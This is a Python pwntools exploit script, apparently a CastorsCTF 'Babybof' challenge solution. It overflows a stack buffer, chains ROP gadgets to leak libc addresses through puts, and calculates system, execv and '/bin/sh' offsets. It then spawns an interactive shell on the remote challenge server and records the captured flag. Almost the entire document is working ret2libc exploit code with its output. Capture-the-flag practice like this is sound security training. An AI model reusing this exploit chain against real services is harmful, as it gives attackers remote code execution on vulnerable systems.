# RazviOverflow
# Python3

from pwn import *
import sys

def parse_address(input_address):
	address = input_address.split(b"\n")[0]

	#print(address)
	#address = address.split(b":")[1].strip()

	while len(address) != 8:
		address += b"\x00"

	print(address)

	address = hex(u64(address))

	return address



get_flag_address = 0x4006e7
padding = b"A" * 0x100
padding += b"B" * 0x8

main_address = 0x0040074d

#binary = process("program")

elf = ELF("program")

#print(elf.symbols)

puts_plt_address = elf.plt[b'puts'] #0x00400590
printf_plt_address = elf.plt[b'printf']

#print(hex(puts_plt_address))

#got_gets_address = elf.got[b'gets']
got_puts_address = elf.got[b'puts'] # 0x601020
got_printf_address = elf.got[b'printf'] # 0x601030
got_gets_address = elf.got[b'gets'] # 0x601040

#print(hex(got_puts_address))
#print(hex(got_printf_address))
#print(hex(got_gets_address))


pop_rdi_gadget_address = 0x004007f3
pop_rsi_pop_r15_gadget_address = 0x004007f1

#print(hex(got_gets_address))
#print(hex(got_puts_address))
#print(hex(got_printf_address))

'''
r2 debugging the GOT table [reloc]
;-- reloc.puts:
            0x00601020      .qword 0x00007f29f112bff0
;-- reloc.gets:
            0x00601040      .qword 0x00007f29f112b5d0                  ; RELOC 64 gets
;-- reloc.printf:
            0x00601030      .qword 0x00007f29f110c430                  ; RELOC 64 printf
'''

payload_puts_address = padding + p64(pop_rdi_gadget_address) + p64(got_puts_address) + p64(puts_plt_address) + p64(main_address) 
payload_printf_address = padding + p64(pop_rdi_gadget_address) + p64(got_printf_address) + p64(puts_plt_address) + p64(main_address) 
payload_gets_address = padding + p64(pop_rdi_gadget_address) + p64(got_gets_address) + p64(puts_plt_address) + p64(main_address) 


#payload = padding + p64(get_flag_address)

binary = remote("chals20.cybercastors.com", 14425)
#binary = process("program")
print(binary.recv())

binary.sendline(payload_puts_address)

puts_address = parse_address(binary.recv())

print("Puts address: " + puts_address) # IMPRESION DEL INPUT
binary.sendline(payload_printf_address)

printf_address = parse_address(binary.recv())

print("Printf address: " + printf_address) # EL RETORNO DE LA FUNCION SOBREESCITA
binary.sendline(payload_gets_address)

gets_address = parse_address(binary.recv())

print("Gets address: " + gets_address)

'''
Output:
b'Welcome to the cybercastors Babybof\nSay your name: '
Puts address: 0x7fee682f35a0
Printf address: 0x7fee682d0e10
Gets address: 0x7fee682f2af0


Matches from https://libc.nullbyte.cat/?q=puts%3A5a0%2Cgets%3Aaf0%2Cprintf%3Ae10&l=libc6_2.31-0ubuntu7_amd64
libc6_2.31-0ubuntu7_amd64
libc6_2.31-0ubuntu8_amd64
libc6_2.31-0ubuntu9_amd64

It doesn't really matter since all of them have the same offsets

I'll get system() and str_bin_sh addresses as offsets from gets_address

execv 00000000000e62c0
'''

system_address = int(gets_address, 16) - 0x316e0
str_bin_sh = int(gets_address, 16) + 0x130aba
execv_address = int(gets_address, 16) + 0x5f7d0

print("System address: " + str(hex(system_address)))
print("str_bin_sh address: " + str(hex(str_bin_sh)))

last_input = padding + p64(pop_rdi_gadget_address) + p64(str_bin_sh) + p64(pop_rsi_pop_r15_gadget_address) + p64(0x0) + p64(0x0) + p64(execv_address)

binary.sendline(last_input)

binary.interactive()

# castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
